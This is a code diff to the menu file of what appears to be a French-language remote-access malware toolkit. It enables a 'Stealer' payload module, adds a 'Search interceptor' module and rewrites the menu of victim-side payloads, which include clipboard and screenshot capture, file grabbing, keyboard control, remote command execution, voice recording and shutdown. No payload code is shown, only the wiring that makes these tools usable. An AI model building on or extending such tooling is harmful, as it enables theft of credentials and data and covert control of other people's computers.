@@ -1,7 +1,7 @@
 from colorama import Fore, Style
 import os 
-from Option.modules.payload.clipboard import clipboard_module
-from Option.modules.payload.screenshot import screenshot_module
+from Option.modules.payload.clipboard import *
+from Option.modules.payload.screenshot import *
 from Option.modules.payload.dirlist import *
 from Option.modules.payload.filegrab import *
 from Option.modules.payload.keybcontrol import *
@@ -10,16 +10,12 @@ from Option.modules.payload.rmdir import *
 from Option.modules.payload.rmscript import *
 from Option.modules.payload.runcmd import *
 from Option.modules.payload.shutdown import *
-#from Option.modules.payload.steal import stealer_module
+from Option.modules.payload.steal import *
 from Option.modules.payload.restartpc import *
 from Option.modules.payload.voicerec import *
 from Option.modules.payload.wallpaper import *
-#from Option.modules.capture.phishing import phishing_module
-#from Option.modules.capture.keylogger import keylogger_module
+from Option.modules.payload.search_interceptor import *
 #from Option.modules.scanner.vulnerabilityscanner import vulnerability_scanner_module
-#from Option.modules.scanner.IPscan import network_scanner_module
-#from Option.modules.scanner.dirscan import directory_scanner_module
-#from Option.modules.scanner.localscan import localhost_scanner_module
 from Option.modules.network.porthammer import *
 from Option.modules.network.networkinfo import *
 
@@ -67,9 +63,10 @@ Appuyez sur Entrée pour continuer...
         ("Remove file", rmscript),
         ("Run Command on terminal", runcmd_module),
         ("Shutdown", shutdown_module),
-        ("Stealer", None),
+        ("Stealer", steal_module),
         ("Voice record", voicerec),
         ("Change wallpaper", wallpaper),
+        ("Search interceptor"),
     ]
 
     captures = [
@@ -100,17 +97,18 @@ Appuyez sur Entrée pour continuer...
         1. Clipboard
         2. Screenshot
         3. Directory listing
-        4. File Grabber 
-        5. keyboard controller
-        6. Network info
-        7. Open url
+        4. File Grabber
+        5. Keyboard controller
+        6. Open url
+        7. Restart PC
         8. Remove Directory
-        9. Remove file 
+        9. Remove file
         10. Run Command on terminal
-        11. Stealer (en développement)
-        12. Voice record 
-        13. Change wallpaper    
-
+        11. Shutdown
+        12. Stealer
+        13. Voice record
+        14. Change wallpaper
+        15. Search interceptor
 
     """)
             payload_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
